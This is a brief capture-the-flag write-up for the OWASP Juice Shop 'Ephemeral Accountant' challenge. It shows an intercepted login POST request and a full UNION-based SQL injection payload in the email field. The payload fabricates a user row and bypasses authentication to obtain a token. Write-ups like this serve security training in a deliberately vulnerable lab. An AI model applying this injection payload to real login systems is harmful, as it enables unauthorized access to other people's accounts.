# Ephemeral Accountant

This challenge involves using SQL injection to simulate the login of a non-existent but temporarily created user "acc0unt4nt@juice-sh.op" without actually adding the account to the database permanently.

Using the information of user from the database, we know the `user` has many variable etc. We use it to inject the login page. Open your intercept and write anything on email/password section. 

As we get the typical HTTP POST request

```bash
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123"
}
```
Change email using UNION and the variable to mimic the user a legitimate user. 

```bash
{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "test1234"
}
```

![alt text](<Screenshot (22).png>)

As you can see we got authentication token means we already succed to solved the challenge.

![alt text](<Screenshot (23).png>)